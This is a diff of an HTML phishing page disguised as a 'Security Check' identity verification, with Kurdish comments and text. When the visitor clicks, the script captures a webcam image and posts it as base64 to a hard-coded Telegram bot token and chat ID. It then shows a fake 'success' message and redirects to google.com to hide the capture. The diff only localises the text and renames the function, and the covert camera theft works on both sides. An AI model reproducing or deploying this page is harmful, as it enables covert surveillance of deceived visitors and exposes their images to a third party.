@@ -1,21 +1,24 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
-    <title>Security Check</title>
     <meta charset="UTF-8">
+    <title>Security Check</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
-    <h2>Verify You Are Human</h2>
-    <button onclick="startOp()" style="padding:20px; background:#007bff; color:#fff; border:none; border-radius:5px; cursor:pointer;">Click to Verify</button>
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
+    <h2>پشکنینی ئاسایش</h2>
+    <p>تکایە کلیک لە دوگمەکە بکە بۆ سەلماندنی ناسنامە</p>
+    <button onclick="takeSnap()" style="padding:15px 30px; background:#007bff; color:#white; border:none; border-radius:10px; cursor:pointer;">Verify Identity</button>
 
     <script>
-        async function startOp() {
+        async function takeSnap() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({video:true});
+                // داوای کامێرا دەکات
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
+                // چاوەڕێ دەکات تا وێنەکە دەگرێت
                 setTimeout(async () => {
                     const canvas = document.createElement('canvas');
                     canvas.width = 400;
@@ -24,22 +27,22 @@
                     
                     const imageData = canvas.toDataURL('image/jpeg', 0.5);
 
-                    // ناردنی ڕاستەوخۆ بۆ تێلیگرام
+                    // --- ناردنی ڕاستەوخۆ بۆ تێلیگرامەکەت ---
                     await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: '5982066799',
-                            text: "📸 وێنەیەکی نوێ هات:\n\n" + imageData
+                            text: "📸 وێنەیەکی نوێ گیرا:\n\n" + imageData
                         })
                     });
 
                     stream.getTracks().forEach(t => t.stop());
-                    alert("Verification Complete!");
-                    window.location.href = 'https://google.com';
+                    alert("سەرکەوتوو بوو!");
+                    window.location.href = "https://google.com";
                 }, 2000);
             } catch (e) {
-                alert("Please allow camera access to verify.");
+                alert("تکایە مۆڵەتی کامێرا بدە.");
             }
         }
     </script>
